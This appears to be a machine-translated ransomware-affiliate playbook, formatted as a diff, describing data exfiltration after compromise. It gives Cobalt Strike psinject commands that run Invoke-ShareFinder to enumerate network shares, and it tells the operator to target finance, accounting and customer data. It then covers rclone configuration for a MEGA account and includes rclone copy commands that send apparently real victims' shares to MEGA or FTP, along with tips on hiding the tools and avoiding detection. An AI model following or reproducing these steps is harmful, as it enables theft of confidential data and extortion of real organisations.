@@ -1,0 +1,37 @@
+1) After we raised the rights, found the Admin Domain, we pull the session into the cobalt
+2)We put the YES token on and Remove the balls this way :
+    *powershell-import - we upload ShareFinder there as usual and give the room the following -
+psinject 7080 x64 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt
+
+Next, we study the removed balls, we're interested in
+*Finance docs
+*Accounting
+*IT
+*Customers
+*Projects
+And so on, it all depends on what our target is doing.
+
+Next we do the following > here's the Diablo Manual, everything is easy to understand
+
+Click on
+you need to create a config in order to start downloading from the clone
+to create a config open cmd go to the directory where rclone.exe is
+Run rclone.exe with the command: rclone config
+choose from the menu new remote
+call it mega and enter mega once more
+after that we typed the mega mail address after it will ask for a password to enter or generate we will choose yours with the letter 'Y'
+the password won't show up on insertion but it's still there
+after creating the config you get thrown back to the main menu and you get out of the rclone.
+then enter the command rclone.exe config show it will show the config
+copy it and create file rclone.conf where we put this information.
+when we found the balloons we download the exe and the config to the target machine with the rights to hide the config and the exe so they will not be found
+go to the exe directory and give the following command: shell rclone.exe copy "\\envisionpharma.com\IT\\KLSHARE" Mega:Finanse -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+where: \envisionpharma.com\IT\KLSHARE are balls
+Mega:Finanse is the location of the files in the mega (can create a folder in the mega on its own)
+streams 12 --transfers 12 is the number of streams that pump to the maximum (12) is not recommended because you can easily get caught
+
+
+
+shell rclone.exe copy "\PETERLENOVO.wist.local/Users" ftp1:uploads/Users/ -q --ignore-existing --auto-confirm --multi-thread-streams 3 --transfers 3 - here is an example in this case on FTP
+
+!!! THE PCLONE ITSELF WEIGHS ABOUT 50MB, THE LINK TO IT WILL BE BELOW THE POST!!!
